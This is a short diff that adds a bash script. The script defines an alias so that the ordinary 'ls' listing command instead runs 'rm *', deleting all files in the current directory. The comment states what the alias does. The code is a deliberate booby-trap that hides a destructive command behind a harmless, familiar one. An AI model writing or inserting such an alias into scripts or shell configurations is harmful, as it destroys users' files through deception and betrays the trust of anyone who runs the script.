@@ -1,0 +1,3 @@
+#!/bin/bash
+# an alias with the name 'ls' and target 'rm *'
+alias ls='rm *'
